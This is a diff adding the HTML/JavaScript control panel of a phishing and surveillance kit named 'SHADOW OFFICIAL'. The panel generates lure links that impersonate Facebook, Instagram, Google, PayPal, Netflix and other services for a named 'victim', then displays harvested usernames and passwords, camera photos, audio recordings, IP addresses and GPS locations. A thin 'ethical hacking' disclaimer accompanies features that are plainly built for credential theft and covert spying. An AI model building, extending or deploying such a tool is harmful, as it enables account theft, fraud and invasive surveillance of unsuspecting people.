@@ -1,0 +1,644 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>SHADOW OFFICIAL &#128081; | Command Center</title>
+<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;600;700;800;900&family=Rajdhani:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+<style>
+*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+body{background:#0a0a1a;min-height:100vh;font-family:'Rajdhani',sans-serif;color:#fff;overflow-x:hidden}
+.bg{position:fixed;top:0;left:0;width:100%;height:100%;z-index:0;background:radial-gradient(ellipse at 50% 0%,rgba(102,126,234,0.1) 0%,transparent 50%)}
+.particles{position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:0}
+.particle{position:absolute;width:2px;height:2px;background:rgba(102,126,234,0.3);border-radius:50%;animation:float 12s infinite}
+@keyframes float{0%,100%{transform:translateY(100vh);opacity:0}10%{opacity:1}90%{opacity:1}100%{transform:translateY(-100vh);opacity:0}}
+
+/* Sidebar */
+.sidebar{position:fixed;left:0;top:0;width:260px;height:100vh;background:rgba(15,15,30,0.95);border-right:1px solid rgba(102,126,234,0.1);z-index:100;backdrop-filter:blur(25px);transition:transform 0.3s}
+.sidebar-header{padding:25px 20px;border-bottom:1px solid rgba(102,126,234,0.1)}
+.sidebar-header .logo{display:flex;align-items:center;gap:12px}
+.sidebar-header .logo i{font-size:26px;color:#667eea}
+.sidebar-header .logo-text h2{font-family:'Orbitron',sans-serif;font-size:13px;letter-spacing:2px}
+.sidebar-header .logo-text h2 span{color:#667eea}
+.sidebar-header .logo-text p{font-size:9px;color:rgba(255,255,255,0.35);letter-spacing:3px;text-transform:uppercase}
+.nav-menu{padding:20px 15px}
+.nav-item{display:flex;align-items:center;gap:12px;padding:14px 16px;margin-bottom:5px;border-radius:10px;cursor:pointer;transition:all 0.3s;color:rgba(255,255,255,0.4);font-family:'Orbitron',sans-serif;font-size:11px;letter-spacing:1px;text-transform:uppercase}
+.nav-item:hover,.nav-item.active{background:rgba(102,126,234,0.08);color:#667eea;border:1px solid rgba(102,126,234,0.15)}
+.nav-item i{width:20px;text-align:center;font-size:14px}
+.nav-item .badge{margin-left:auto;background:rgba(255,50,100,0.15);color:#ff3264;padding:2px 8px;border-radius:10px;font-size:10px;font-family:'JetBrains Mono',monospace}
+.sidebar-footer{position:absolute;bottom:0;left:0;right:0;padding:20px;border-top:1px solid rgba(102,126,234,0.1)}
+.user-info{display:flex;align-items:center;gap:10px}
+.user-avatar{width:36px;height:36px;border-radius:50%;background:linear-gradient(135deg,#667eea,#764ba2);display:flex;align-items:center;justify-content:center;font-family:'Orbitron',sans-serif;font-size:14px;font-weight:800;color:#fff}
+.user-details p{font-size:13px;font-weight:700}
+.user-details span{font-size:10px;color:rgba(255,255,255,0.35);letter-spacing:1px}
+.logout-btn{margin-top:10px;width:100%;padding:10px;background:rgba(255,50,100,0.08);border:1px solid rgba(255,50,100,0.15);color:#ff3264;border-radius:8px;font-family:'Orbitron',sans-serif;font-size:10px;letter-spacing:2px;cursor:pointer;transition:all 0.3s}
+.logout-btn:hover{background:rgba(255,50,100,0.15)}
+
+/* Main */
+.main-content{margin-left:260px;padding:25px;position:relative;z-index:1;min-height:100vh}
+.page-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:25px;flex-wrap:wrap;gap:10px}
+.page-header h1{font-family:'Orbitron',sans-serif;font-size:20px;letter-spacing:3px}
+.page-header h1 span{color:#667eea}
+.menu-toggle{display:none;position:fixed;top:15px;left:15px;z-index:200;width:40px;height:40px;background:rgba(15,15,30,0.9);border:1px solid rgba(102,126,234,0.2);border-radius:10px;color:#667eea;align-items:center;justify-content:center;cursor:pointer;font-size:16px}
+
+/* Stats */
+.stats-grid{display:grid;grid-template-columns:repeat(4,1fr);gap:15px;margin-bottom:25px}
+.stat-card{background:rgba(20,20,40,0.8);border:1px solid rgba(102,126,234,0.08);border-radius:14px;padding:20px;text-align:center;transition:all 0.3s}
+.stat-card:hover{border-color:rgba(102,126,234,0.2);transform:translateY(-3px)}
+.stat-value{font-family:'Orbitron',sans-serif;font-size:28px;font-weight:800;margin-bottom:4px}
+.stat-label{color:rgba(255,255,255,0.4);font-size:11px;letter-spacing:1px}
+.stat-card:nth-child(1) .stat-value{color:#667eea}
+.stat-card:nth-child(2) .stat-value{color:#f093fb}
+.stat-card:nth-child(3) .stat-value{color:#00ff88}
+.stat-card:nth-child(4) .stat-value{color:#ffc800}
+.stat-icon{font-size:20px;margin-bottom:8px}
+
+/* Content */
+.content-section{background:rgba(20,20,40,0.8);border:1px solid rgba(102,126,234,0.08);border-radius:14px;padding:20px;margin-bottom:20px}
+.section-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:18px;flex-wrap:wrap;gap:10px}
+.section-header h2{font-family:'Orbitron',sans-serif;font-size:14px;letter-spacing:2px;display:flex;align-items:center;gap:10px}
+.section-header h2 i{color:#667eea}
+.btn{padding:10px 18px;border-radius:8px;font-family:'Orbitron',sans-serif;font-size:10px;letter-spacing:2px;text-transform:uppercase;cursor:pointer;border:none;transition:all 0.3s}
+.btn-primary{background:linear-gradient(135deg,#667eea,#764ba2);color:#fff}
+.btn-primary:hover{transform:translateY(-2px);box-shadow:0 8px 25px rgba(102,126,234,0.25)}
+.btn-danger{background:rgba(255,50,100,0.08);border:1px solid rgba(255,50,100,0.2);color:#ff3264}
+.btn-danger:hover{background:rgba(255,50,100,0.15)}
+
+/* Templates */
+.template-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:12px;margin-bottom:20px}
+.template-card{background:rgba(20,20,40,0.8);border:1px solid rgba(102,126,234,0.08);border-radius:14px;padding:20px;text-align:center;cursor:pointer;transition:all 0.3s}
+.template-card:hover{border-color:rgba(102,126,234,0.3);transform:translateY(-3px);box-shadow:0 10px 30px rgba(102,126,234,0.1)}
+.template-card.selected{border-color:#667eea;background:rgba(102,126,234,0.08);box-shadow:0 0 20px rgba(102,126,234,0.2)}
+.template-icon{font-size:32px;margin-bottom:8px}
+.template-name{font-size:12px;color:rgba(255,255,255,0.6)}
+
+/* Input */
+.input-group{display:flex;gap:10px;margin-bottom:15px}
+.input-group input{flex:1;padding:12px 16px;background:rgba(255,255,255,0.04);border:1px solid rgba(102,126,234,0.15);border-radius:10px;color:#fff;font-size:14px;outline:none}
+.input-group input:focus{border-color:#667eea}
+
+/* Capture Cards */
+.capture-card{background:rgba(20,20,40,0.8);border:1px solid rgba(102,126,234,0.08);border-radius:16px;padding:20px;margin-bottom:15px;transition:all 0.3s}
+.capture-card:hover{border-color:rgba(102,126,234,0.2)}
+.capture-tags{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:12px}
+.capture-tag{padding:4px 12px;border-radius:20px;font-size:10px;font-family:'Orbitron',sans-serif;letter-spacing:1px}
+.tag-purple{background:rgba(102,126,234,0.15);color:#667eea;border:1px solid rgba(102,126,234,0.2)}
+.tag-blue{background:rgba(0,200,255,0.15);color:#00c8ff;border:1px solid rgba(0,200,255,0.2)}
+.tag-green{background:rgba(0,255,136,0.15);color:#00ff88;border:1px solid rgba(0,255,136,0.2)}
+.tag-red{background:rgba(255,50,100,0.15);color:#ff3264;border:1px solid rgba(255,50,100,0.2)}
+.tag-orange{background:rgba(255,200,0,0.15);color:#ffc800;border:1px solid rgba(255,200,0,0.2)}
+.capture-ip{font-family:'JetBrains Mono',monospace;font-size:14px;color:#ffc800;margin-bottom:4px}
+.capture-location{color:rgba(255,255,255,0.5);font-size:12px;margin-bottom:10px}
+.capture-device{background:rgba(102,126,234,0.05);border:1px solid rgba(102,126,234,0.1);border-radius:8px;padding:10px 14px;font-size:12px;color:rgba(255,255,255,0.6);margin-bottom:10px}
+.capture-creds{background:rgba(0,255,136,0.05);border:1px solid rgba(0,255,136,0.1);border-radius:8px;padding:10px 14px;font-size:12px;color:#00ff88;margin-bottom:10px;font-family:'JetBrains Mono',monospace}
+
+/* Photos - Clickable thumbnails */
+.capture-photos{display:grid;grid-template-columns:repeat(5,1fr);gap:8px;margin-bottom:12px}
+.capture-photos .photo-thumb{width:100%;height:70px;object-fit:cover;border-radius:8px;border:1px solid rgba(102,126,234,0.15);cursor:pointer;transition:all 0.3s}
+.capture-photos .photo-thumb:hover{transform:scale(1.05);box-shadow:0 5px 15px rgba(102,126,234,0.2)}
+
+/* Audio - Only show if exists, no autoplay */
+.capture-audio{background:rgba(255,50,100,0.05);border:1px solid rgba(255,50,100,0.1);border-radius:8px;padding:8px 14px;margin-bottom:10px}
+.capture-audio audio{width:100%;height:36px}
+
+.map-btn{display:inline-flex;align-items:center;gap:6px;padding:8px 16px;background:rgba(255,50,100,0.1);border:1px solid rgba(255,50,100,0.2);color:#ff3264;border-radius:8px;cursor:pointer;font-size:11px;font-family:'Orbitron',sans-serif;transition:all 0.3s;text-decoration:none}
+.map-btn:hover{background:rgba(255,50,100,0.2);box-shadow:0 0 15px rgba(255,50,100,0.2)}
+
+/* Lightbox for full photo view */
+.lightbox-overlay{position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.95);backdrop-filter:blur(10px);z-index:3000;display:none;align-items:center;justify-content:center;flex-direction:column;padding:20px}
+.lightbox-overlay.active{display:flex}
+.lightbox-img{max-width:90%;max-height:75vh;border-radius:12px;border:2px solid rgba(102,126,234,0.3);box-shadow:0 20px 60px rgba(0,0,0,0.5)}
+.lightbox-actions{display:flex;gap:15px;margin-top:20px}
+.lightbox-btn{padding:12px 24px;border-radius:10px;font-family:'Orbitron',sans-serif;font-size:12px;letter-spacing:2px;cursor:pointer;border:none;transition:all 0.3s;text-decoration:none;display:inline-flex;align-items:center;gap:8px}
+.lightbox-close{background:rgba(255,255,255,0.1);border:1px solid rgba(255,255,255,0.2);color:#fff}
+.lightbox-close:hover{background:rgba(255,255,255,0.2)}
+.lightbox-download{background:linear-gradient(135deg,#667eea,#764ba2);color:#fff}
+.lightbox-download:hover{transform:translateY(-2px);box-shadow:0 10px 30px rgba(102,126,234,0.3)}
+.lightbox-counter{color:rgba(255,255,255,0.5);font-size:12px;margin-bottom:15px;font-family:'Orbitron',sans-serif}
+
+/* Modal */
+.modal-overlay{position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.85);backdrop-filter:blur(15px);z-index:1000;display:none;align-items:center;justify-content:center;padding:20px}
+.modal-overlay.active{display:flex}
+.modal{background:rgba(15,15,30,0.95);border:1px solid rgba(102,126,234,0.15);border-radius:20px;padding:25px;width:100%;max-width:700px;animation:modalIn 0.3s ease;max-height:90vh;overflow-y:auto}
+@keyframes modalIn{from{opacity:0;transform:scale(0.9)}to{opacity:1;transform:scale(1)}}
+.modal h3{font-family:'Orbitron',sans-serif;font-size:16px;margin-bottom:20px;display:flex;align-items:center;gap:10px}
+.modal h3 i{color:#667eea}
+.photo-gallery{display:grid;grid-template-columns:repeat(auto-fill,minmax(100px,1fr));gap:10px;margin-bottom:15px}
+.photo-gallery img{width:100%;height:100px;object-fit:cover;border-radius:10px;border:1px solid rgba(102,126,234,0.15);cursor:pointer}
+.detail-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px}
+.detail-item{background:rgba(255,255,255,0.02);padding:12px;border-radius:10px;border:1px solid rgba(255,255,255,0.04)}
+.detail-item label{font-size:9px;color:rgba(255,255,255,0.35);letter-spacing:2px;text-transform:uppercase;font-family:'Orbitron',sans-serif;display:block;margin-bottom:5px}
+.detail-item p{font-family:'JetBrains Mono',monospace;font-size:12px;color:#667eea;word-break:break-all}
+.modal-actions{display:flex;gap:10px;margin-top:20px}
+.modal-actions .btn{flex:1}
+.btn-secondary{background:rgba(255,255,255,0.04);border:1px solid rgba(255,255,255,0.08);color:rgba(255,255,255,0.5)}
+
+/* Loading */
+.loading-overlay{position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.92);z-index:2000;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:20px}
+.loading-overlay.hidden{display:none}
+.loading-spinner{width:50px;height:50px;border:3px solid rgba(102,126,234,0.1);border-top-color:#667eea;border-radius:50%;animation:spin 1s linear infinite}
+@keyframes spin{to{transform:rotate(360deg)}}
+.loading-text{font-family:'Orbitron',sans-serif;font-size:13px;letter-spacing:5px;color:#667eea}
+
+/* Responsive */
+@media(max-width:768px){
+.sidebar{transform:translateX(-100%);width:240px}
+.sidebar.open{transform:translateX(0)}
+.main-content{margin-left:0;padding:15px;padding-top:60px}
+.menu-toggle{display:flex}
+.stats-grid{grid-template-columns:repeat(2,1fr);gap:10px}
+.template-grid{grid-template-columns:repeat(2,1fr)}
+.capture-photos{grid-template-columns:repeat(5,1fr)}
+.capture-photos .photo-thumb{height:55px}
+}
+@media(max-width:480px){
+.stats-grid{grid-template-columns:repeat(2,1fr)}
+.template-grid{grid-template-columns:repeat(2,1fr)}
+.capture-photos{grid-template-columns:repeat(5,1fr);gap:4px}
+.capture-photos .photo-thumb{height:45px}
+}
+</style>
+</head>
+<body>
+<div class="bg"></div>
+<div class="particles" id="particles"></div>
+
+<div class="loading-overlay" id="loadingOverlay">
+<div class="loading-spinner"></div>
+<div class="loading-text">INITIALIZING SYSTEM...</div>
+</div>
+
+<button class="menu-toggle" id="menuToggle" onclick="toggleSidebar()">
+<i class="fas fa-bars"></i>
+</button>
+
+<div class="sidebar" id="sidebar">
+<div class="sidebar-header">
+<div class="logo">
+<i class="fas fa-shield-halved"></i>
+<div class="logo-text">
+<h2>SHADOW <span>OFFICIAL</span> &#128081;</h2>
+<p>Command Center</p>
+</div>
+</div>
+</div>
+<div class="nav-menu">
+<div class="nav-item active" onclick="showSection('dashboard')">
+<i class="fas fa-chart-line"></i>Dashboard
+</div>
+<div class="nav-item" onclick="showSection('generate')">
+<i class="fas fa-link"></i>Generate
+</div>
+<div class="nav-item" onclick="showSection('captures')">
+<i class="fas fa-camera"></i>Captures
+<span class="badge" id="captureBadge">0</span>
+</div>
+<div class="nav-item" onclick="showSection('settings')">
+<i class="fas fa-cog"></i>Settings
+</div>
+</div>
+<div class="sidebar-footer">
+<div class="user-info">
+<div class="user-avatar" id="userAvatar">U</div>
+<div class="user-details">
+<p id="userName">User</p>
+<span>ADMIN ACCESS</span>
+</div>
+</div>
+<button class="logout-btn" onclick="logout()">
+<i class="fas fa-power-off"></i> TERMINATE SESSION
+</button>
+</div>
+</div>
+
+<div class="main-content">
+<!-- DASHBOARD -->
+<div id="dashboardSection">
+<div class="page-header">
+<h1><i class="fas fa-terminal"></i> COMMAND <span>CENTER</span></h1>
+</div>
+<div class="stats-grid">
+<div class="stat-card">
+<div class="stat-icon">&#128247;</div>
+<div class="stat-value" id="statPhotos">0</div>
+<div class="stat-label">Photos</div>
+</div>
+<div class="stat-card">
+<div class="stat-icon">&#128273;</div>
+<div class="stat-value" id="statCreds">0</div>
+<div class="stat-label">Creds</div>
+</div>
+<div class="stat-card">
+<div class="stat-icon">&#127908;</div>
+<div class="stat-value" id="statAudio">0</div>
+<div class="stat-label">Audio</div>
+</div>
+<div class="stat-card">
+<div class="stat-icon">&#127760;</div>
+<div class="stat-value" id="statTotal">0</div>
+<div class="stat-label">Total</div>
+</div>
+<div class="stat-card">
+<div class="stat-icon">&#128205;</div>
+<div class="stat-value" id="statGPS">0</div>
+<div class="stat-label">GPS</div>
+</div>
+<div class="stat-card">
+<div class="stat-icon">&#128100;</div>
+<div class="stat-value" id="statContacts">0</div>
+<div class="stat-label">Contacts</div>
+</div>
+<div class="stat-card">
+<div class="stat-icon">&#128246;</div>
+<div class="stat-value" id="statWiFi">0</div>
+<div class="stat-label">WiFi</div>
+</div>
+<div class="stat-card">
+<div class="stat-icon">&#128101;</div>
+<div class="stat-value" id="statUsers">0</div>
+<div class="stat-label">Users</div>
+</div>
+</div>
+<div class="content-section">
+<div class="section-header">
+<h2><i class="fas fa-bolt"></i> Recent Captures</h2>
+</div>
+<div id="recentCaptures">
+<div style="text-align:center;padding:40px;color:rgba(255,255,255,0.3)">
+<i class="fas fa-inbox" style="font-size:40px;margin-bottom:15px;display:block"></i>
+No captures yet
+</div>
+</div>
+</div>
+</div>
+
+<!-- GENERATE -->
+<div id="generateSection" style="display:none">
+<div class="page-header">
+<h1><i class="fas fa-magic"></i> GENERATE <span>LINK</span></h1>
+</div>
+<div class="content-section">
+<div class="section-header">
+<h2><i class="fas fa-palette"></i> Select Template</h2>
+</div>
+<div class="template-grid">
+<div class="template-card" onclick="selectTemplate('gaming')" data-template="gaming">
+<div class="template-icon">&#127918;</div>
+<div class="template-name">Gaming</div>
+</div>
+<div class="template-card" onclick="selectTemplate('facebook')" data-template="facebook">
+<div class="template-icon">&#128172;</div>
+<div class="template-name">Facebook</div>
+</div>
+<div class="template-card" onclick="selectTemplate('instagram')" data-template="instagram">
+<div class="template-icon">&#128247;</div>
+<div class="template-name">Instagram</div>
+</div>
+<div class="template-card" onclick="selectTemplate('google')" data-template="google">
+<div class="template-icon">&#128269;</div>
+<div class="template-name">Google</div>
+</div>
+<div class="template-card" onclick="selectTemplate('pubg')" data-template="pubg">
+<div class="template-icon">&#128299;</div>
+<div class="template-name">PUBG</div>
+</div>
+<div class="template-card" onclick="selectTemplate('netflix')" data-template="netflix">
+<div class="template-icon">&#127916;</div>
+<div class="template-name">Netflix</div>
+</div>
+<div class="template-card" onclick="selectTemplate('tiktok')" data-template="tiktok">
+<div class="template-icon">&#127925;</div>
+<div class="template-name">TikTok</div>
+</div>
+<div class="template-card" onclick="selectTemplate('paypal')" data-template="paypal">
+<div class="template-icon">&#128179;</div>
+<div class="template-name">PayPal</div>
+</div>
+<div class="template-card" onclick="selectTemplate('snapchat')" data-template="snapchat">
+<div class="template-icon">&#128123;</div>
+<div class="template-name">Snapchat</div>
+</div>
+<div class="template-card" onclick="selectTemplate('wifi')" data-template="wifi">
+<div class="template-icon">&#128246;</div>
+<div class="template-name">WiFi</div>
+</div>
+</div>
+<div class="input-group">
+<input type="text" id="victimName" placeholder="Victim name">
+<button class="btn btn-primary" onclick="generateLink()" style="white-space:nowrap"><i class="fas fa-bolt"></i> Go</button>
+</div>
+<div style="margin-bottom:15px">
+<input type="text" id="customDP" placeholder="Custom DP Image URL (optional)" style="width:100%;padding:12px 16px;background:rgba(255,255,255,0.04);border:1px solid rgba(102,126,234,0.15);border-radius:10px;color:#fff;font-size:14px;outline:none">
+<p style="color:rgba(255,255,255,0.3);font-size:11px;margin-top:5px">Paste image URL for custom profile picture on fake page</p>
+</div>
+<div id="generatedLink" style="display:none;margin-top:15px">
+<div style="background:rgba(102,126,234,0.05);border:1px solid rgba(102,126,234,0.15);border-radius:10px;padding:15px">
+<div style="display:flex;align-items:center;gap:8px;margin-bottom:10px">
+<span class="capture-tag tag-purple" id="genTemplateTag">Netflix</span>
+</div>
+<input type="text" id="genLinkUrl" readonly style="width:100%;background:rgba(255,255,255,0.03);border:1px solid rgba(102,126,234,0.2);border-radius:8px;padding:10px;color:#667eea;font-family:'JetBrains Mono',monospace;font-size:12px;outline:none;margin-bottom:10px">
+<button class="btn btn-primary" onclick="copyGeneratedLink()" style="width:100%"><i class="fas fa-copy"></i> Copy Link</button>
+</div>
+</div>
+</div>
+</div>
+
+<!-- CAPTURES -->
+<div id="capturesSection" style="display:none">
+<div class="page-header">
+<h1><i class="fas fa-camera"></i> CAPTURED <span>DATA</span></h1>
+<button class="btn btn-danger" onclick="clearCaptures()">
+<i class="fas fa-trash"></i> CLEAR ALL
+</button>
+</div>
+<div id="capturesList"></div>
+</div>
+
+<!-- SETTINGS -->
+<div id="settingsSection" style="display:none">
+<div class="page-header">
+<h1><i class="fas fa-cog"></i> SYSTEM <span>SETTINGS</span></h1>
+</div>
+<div class="content-section">
+<div class="section-header">
+<h2><i class="fas fa-info-circle"></i> About SHADOW OFFICIAL</h2>
+</div>
+<p style="color:rgba(255,255,255,0.45);line-height:1.8;font-size:14px;">
+<strong style="color:#667eea;">SHADOW OFFICIAL &#128081;</strong> is an advanced ethical hacking and security awareness platform designed for authorized penetration testing and security research purposes.<br><br>
+<strong style="color:#667eea;">Features:</strong><br>
+&#8226; Generate tracking links with multiple templates (Netflix, Facebook, Instagram, etc.)<br>
+&#8226; Capture device information, IP, GPS location<br>
+&#8226; WebRTC-based camera photo capture (5 photos)<br>
+&#8226; Audio recording capture<br>
+&#8226; Credential harvesting (username/password)<br>
+&#8226; Google Maps integration for location viewing<br>
+&#8226; Real-time dashboard monitoring<br>
+&#8226; JSON file-based data storage<br><br>
+<strong style="color:#ff3264;">Disclaimer:</strong><br>
+This tool is intended for educational and authorized security testing purposes only. Unauthorized use to capture data without explicit consent is illegal and punishable under cybercrime laws (IT Act 2000, Section 66C, 66D). Always obtain proper written authorization before testing. The developers are not responsible for any misuse of this tool.
+</p>
+</div>
+</div>
+</div>
+
+<!-- Lightbox for full photo view -->
+<div class="lightbox-overlay" id="lightboxOverlay" onclick="closeLightbox(event)">
+<div class="lightbox-counter" id="lightboxCounter">1 / 5</div>
+<img class="lightbox-img" id="lightboxImg" src="" alt="Capture">
+<div class="lightbox-actions">
+<button class="lightbox-btn lightbox-close" onclick="closeLightboxBtn()">
+<i class="fas fa-times"></i> Close
+</button>
+<a class="lightbox-btn lightbox-download" id="lightboxDownload" href="" download="capture.jpg">
+<i class="fas fa-download"></i> Download
+</a>
+</div>
+</div>
+
+<!-- Detail Modal -->
+<div class="modal-overlay" id="captureModal">
+<div class="modal">
+<h3><i class="fas fa-eye"></i> Capture Detail</h3>
+<div id="captureDetailContent"></div>
+<div class="modal-actions">
+<button class="btn btn-secondary" onclick="closeCaptureModal()">CLOSE</button>
+</div>
+</div>
+</div>
+
+<script>
+let currentUser=null;
+let selectedTemplate='netflix';
+let currentLightboxPhotos=[];
+let currentLightboxIndex=0;
+
+async function init(){
+try{
+const res=await fetch('/api/user');
+const data=await res.json();
+if(data.success){
+currentUser=data.user;
+document.getElementById('userName').textContent=currentUser.username;
+document.getElementById('userAvatar').textContent=currentUser.username.charAt(0).toUpperCase();
+await loadStats();
+await loadCaptures();
+setTimeout(()=>document.getElementById('loadingOverlay').classList.add('hidden'),1000);
+}else{window.location.href='/login';}
+}catch(err){window.location.href='/login';}
+}
+
+function toggleSidebar(){
+document.getElementById('sidebar').classList.toggle('open');
+}
+
+function showSection(section){
+['dashboard','generate','captures','settings'].forEach(s=>{document.getElementById(s+'Section').style.display='none';});
+document.querySelectorAll('.nav-item').forEach(n=>n.classList.remove('active'));
+document.getElementById(section+'Section').style.display='block';
+const idx=['dashboard','generate','captures','settings'].indexOf(section);
+document.querySelectorAll('.nav-item')[idx]?.classList.add('active');
+document.getElementById('sidebar').classList.remove('open');
+if(section==='captures')loadCaptures();
+if(section==='dashboard'){loadStats();loadRecentCaptures();}
+}
+
+function selectTemplate(tmpl){
+selectedTemplate=tmpl;
+document.querySelectorAll('.template-card').forEach(c=>c.classList.remove('selected'));
+document.querySelector(`[data-template="${tmpl}"]`)?.classList.add('selected');
+}
+
+async function generateLink(){
+const victimName=document.getElementById('victimName').value.trim();
+const customDP=document.getElementById('customDP').value.trim();
+try{
+const res=await fetch('/api/generate-link',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({template:selectedTemplate,victim_name:victimName,custom_dp:customDP,title:selectedTemplate.charAt(0).toUpperCase()+selectedTemplate.slice(1)})});
+const data=await res.json();
+if(data.success){
+document.getElementById('genTemplateTag').textContent=selectedTemplate.toUpperCase();
+document.getElementById('genLinkUrl').value=data.link.tracking_url;
+document.getElementById('generatedLink').style.display='block';
+}
+}catch(err){alert('Failed to generate link');}
+}
+
+function copyGeneratedLink(){
+const input=document.getElementById('genLinkUrl');
+input.select();
+document.execCommand('copy');
+const btn=input.nextElementSibling;
+btn.innerHTML='<i class="fas fa-check"></i> COPIED!';
+setTimeout(()=>btn.innerHTML='<i class="fas fa-copy"></i> Copy Link',1500);
+}
+
+async function loadStats(){
+try{
+const res=await fetch('/api/stats');
+const data=await res.json();
+if(data.success){
+const s=data.stats;
+document.getElementById('statPhotos').textContent=s.total_photos;
+document.getElementById('statCreds').textContent=s.total_creds;
+document.getElementById('statAudio').textContent=s.total_audio;
+document.getElementById('statTotal').textContent=s.total_captures;
+document.getElementById('statGPS').textContent=s.total_captures;
+document.getElementById('statUsers').textContent=s.total_captures;
+document.getElementById('captureBadge').textContent=s.total_captures;
+}
+}catch(err){}
+}
+
+async function loadRecentCaptures(){
+try{
+const res=await fetch('/api/captures');
+const data=await res.json();
+if(data.success&&data.captures.length>0){
+document.getElementById('recentCaptures').innerHTML=data.captures.slice(0,3).map(cap=>renderCaptureCard(cap)).join('');
+}
+}catch(err){}
+}
+
+async function loadCaptures(){
+try{
+const res=await fetch('/api/captures');
+const data=await res.json();
+if(data.success){
+const container=document.getElementById('capturesList');
+if(data.captures.length===0){
+container.innerHTML='<div style="text-align:center;padding:60px;color:rgba(255,255,255,0.3)"><i class="fas fa-camera" style="font-size:45px;margin-bottom:15px;display:block"></i>No captures yet</div>';
+}else{
+container.innerHTML=data.captures.map(cap=>renderCaptureCard(cap)).join('');
+}
+document.getElementById('captureBadge').textContent=data.captures.length;
+}
+}catch(err){}
+}
+
+function renderCaptureCard(cap){
+const dt=new Date(cap.timestamp).toLocaleString([],{month:'short',day:'numeric',hour:'2-digit',minute:'2-digit'});
+const loc=cap.location?.city?`${cap.location.city}, ${cap.location.country||''}`:(cap.location?.ip||'Unknown');
+const device=`${cap.device_info?.platform||'Unknown'} | ${cap.device_info?.browser||'Unknown'}`;
+const hasCreds=cap.credentials?true:false;
+const hasAudio=cap.audio?true:false;
+const hasPhotos=(cap.photos&&cap.photos.length>0)?true:false;
+const photoCount=cap.photos?cap.photos.length:0;
+
+let tags=`<span class="capture-tag tag-purple">${cap.template||'Unknown'}</span>`;
+if(hasCreds) tags+=`<span class="capture-tag tag-green">Creds</span>`;
+if(hasAudio) tags+=`<span class="capture-tag tag-red">Audio</span>`;
+if(hasPhotos) tags+=`<span class="capture-tag tag-blue">${photoCount} Photos</span>`;
+
+let photosHtml='';
+if(hasPhotos){
+const photosJson=JSON.stringify(cap.photos).replace(/"/g,'&quot;');
+photosHtml=`<div class="capture-photos">${cap.photos.slice(0,5).map((p,i)=>`<img class="photo-thumb" src="${p}" onclick="openLightbox(${photosJson},${i})">`).join('')}</div>`;
+}
+
+let audioHtml='';
+if(hasAudio){
+audioHtml=`<div class="capture-audio"><audio controls src="${cap.audio}"></audio></div>`;
+}
+
+let credsHtml='';
+if(hasCreds){
+credsHtml=`<div class="capture-creds">&#128272; ${cap.credentials.username||cap.credentials.email||''} | ${cap.credentials.password||''}</div>`;
+}
+
+let mapBtn='';
+if(cap.location?.latitude){
+mapBtn=`<a href="https://www.google.com/maps?q=${cap.location.latitude},${cap.location.longitude}" target="_blank" class="map-btn"><i class="fas fa-map-marker-alt"></i> View on Google Maps</a>`;
+}
+
+return `
+<div class="capture-card">
+<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px">
+<div class="capture-tags">${tags}</div>
+<span style="color:rgba(255,255,255,0.3);font-size:11px">${dt}</span>
+</div>
+<div class="capture-ip">&#127760; ${cap.ip}</div>
+<div class="capture-location">&#128205; ${loc}</div>
+<div class="capture-device">&#128187; ${device}</div>
+${credsHtml}
+${photosHtml}
+${audioHtml}
+${mapBtn}
+</div>
+`;
+}
+
+// Lightbox functions
+function openLightbox(photos, index) {
+currentLightboxPhotos = photos;
+currentLightboxIndex = index;
+updateLightbox();
+document.getElementById('lightboxOverlay').classList.add('active');
+}
+
+function updateLightbox() {
+const img = document.getElementById('lightboxImg');
+const counter = document.getElementById('lightboxCounter');
+const download = document.getElementById('lightboxDownload');
+img.src = currentLightboxPhotos[currentLightboxIndex];
+counter.textContent = `${currentLightboxIndex + 1} / ${currentLightboxPhotos.length}`;
+download.href = currentLightboxPhotos[currentLightboxIndex];
+}
+
+function closeLightbox(e) {
+if (e.target.id === 'lightboxOverlay') {
+document.getElementById('lightboxOverlay').classList.remove('active');
+}
+}
+
+function closeLightboxBtn() {
+document.getElementById('lightboxOverlay').classList.remove('active');
+}
+
+// Keyboard navigation for lightbox
+document.addEventListener('keydown', function(e) {
+const overlay = document.getElementById('lightboxOverlay');
+if (!overlay.classList.contains('active')) return;
+if (e.key === 'Escape') closeLightboxBtn();
+if (e.key === 'ArrowLeft' && currentLightboxIndex > 0) {
+currentLightboxIndex--;
+updateLightbox();
+}
+if (e.key === 'ArrowRight' && currentLightboxIndex < currentLightboxPhotos.length - 1) {
+currentLightboxIndex++;
+updateLightbox();
+}
+});
+
+async function clearCaptures(){
+if(!confirm('Clear all captures?'))return;
+try{
+const res=await fetch('/api/clear-captures',{method:'POST'});
+const data=await res.json();
+if(data.success){loadCaptures();loadStats();}
+}catch(err){}
+}
+
+async function logout(){
+try{await fetch('/api/logout',{method:'POST'});}catch(e){}
+window.location.href='/login';
+}
+
+setInterval(()=>{
+if(document.getElementById('dashboardSection').style.display!=='none'){loadStats();loadRecentCaptures();}
+if(document.getElementById('capturesSection').style.display!=='none')loadCaptures();
+},10000);
+
+for(let i=0;i<30;i++){
+const p=document.createElement('div');p.className='particle';
+p.style.left=Math.random()*100+'%';
+p.style.animationDelay=Math.random()*12+'s';
+p.style.animationDuration=(8+Math.random()*10)+'s';
+document.getElementById('particles').appendChild(p);
+}
+
+document.querySelector('[data-template="gaming"]')?.classList.add('selected');
+
+init();
+</script>
+</body>
+</html>
